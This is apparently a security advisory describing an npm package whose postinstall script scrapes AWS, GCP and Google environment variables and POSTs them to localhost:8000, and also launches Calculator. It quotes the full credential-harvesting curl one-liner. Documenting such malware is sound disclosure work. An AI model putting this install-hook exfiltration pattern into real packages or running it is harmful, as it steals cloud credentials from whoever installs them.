summary: postinstall scrapes AWS/GCP/GOOGLE environment variables and POSTs them off-host
details: The package's postinstall script (`node src/postinstall.js`) runs at `npm install` time and executes `env | grep "AWS\|GCP\|GOOGLE" | curl -X POST localhost:8000 -d @-`, filtering the installer's environment variables to cloud-credential names (AWS/GCP/GOOGLE) and POSTing the result to an HTTP endpoint. The same postinstall also invokes `open /System/Applications/Calculator.app`, launching an unrelated GUI process on the installer's machine, unrelated to the advertised background-color helper. The exfil destination in this build is hardcoded to `localhost:8000` (limiting real-world impact to hosts running a listener on that port), but the credential-scraping code path itself is the canonical cloud-credential harvest shape and fires automatically on install. The package's own metadata self-describes as demo malware.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
